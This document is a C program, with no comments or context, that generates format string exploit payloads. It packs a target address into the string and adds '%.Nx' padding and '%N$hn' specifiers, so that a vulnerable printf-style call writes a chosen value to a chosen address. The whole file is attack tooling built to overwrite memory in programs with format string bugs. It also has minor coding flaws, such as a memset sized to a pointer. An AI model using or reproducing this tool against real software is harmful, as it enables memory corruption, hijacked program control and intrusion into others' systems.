#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char* frmstr_builder(unsigned long addr, unsigned long value, int pos)
{
  char *buf;
  
  unsigned char byte1, byte2, byte3, byte4;
  unsigned long high, low;
  int length = 100;
  
  byte1 = (addr & 0xff000000) >> 24;
  byte2 = (addr & 0x00ff0000) >> 16;
  byte3 = (addr & 0x0000ff00) >> 8;
  byte4 = (addr & 0x000000ff);

  high = (value & 0xffff0000) >> 16;
  low =  (value & 0x0000ffff);

  fprintf(stderr, "addr:    %#x\n", addr);
  fprintf(stderr, "byte1:   %#x (%c)\n", byte1, byte1);
  fprintf(stderr, "byte2:   %#x (%c)\n", byte2, byte2);
  fprintf(stderr, "byte3:   %#x (%c)\n", byte3, byte3);
  fprintf(stderr, "byte4:   %#x (%c)\n", byte4, byte4);
  fprintf(stderr, "byte4+2: %#x (%c)\n", byte4+2, byte4+2);
  fprintf(stderr, "value:   %d (%#x)\n", value, value);
  fprintf(stderr, "high:    %d (%#x)\n", high, high);
  fprintf(stderr, "low:     %d (%#x)\n", low, low);
  fprintf(stderr, "pos: %d\n", pos);

  if ( !(buf = (char*)malloc(length*sizeof(char))) ) {
    perror("allocate buffer failed");
    exit(0);
  }

  memset(buf, 0, sizeof(buf));

  if (high < low) {

    snprintf(buf,
         length,
         "%c%c%c%c"
         "%c%c%c%c"

	 
         "%%.%hdx"
         "%%%d$hn"
	 
         "%%.%hdx"
         "%%%d$hn",

         byte4+2, byte3, byte2, byte1, 
         byte4, byte3, byte2, byte1, 

         high-8, 
         pos,

         low-high, 
         pos+1);

  } else {

     snprintf(buf,
         length,
         "%c%c%c%c"
         "%c%c%c%c"
	 
         "%%.%hdx"
         "%%%d$hn"
	 
         "%%.%hdx"
         "%%%d$hn",

         byte4+2, byte3, byte2, byte1, 
         byte4, byte3, byte2, byte1, 

         low-8, 
         pos+1,

         high-low, 
         pos);
  }
  return buf;
}

int main(int argc, char *argv[]) {

  char *buf;  

  if (argc != 4) {
    printf("Usage: %s <address> <value> <position>\n", argv[0]);
    exit(-1);}

  buf = frmstr_builder(strtoul(argv[1], NULL, 16), 
			strtoul(argv[2], NULL, 16), 
			atoi(argv[3]));
  
  fprintf (stderr, "buf: [%s] (%d)\n\n", buf, strlen(buf));
  printf ("%s", buf);
	
  return 0;
}
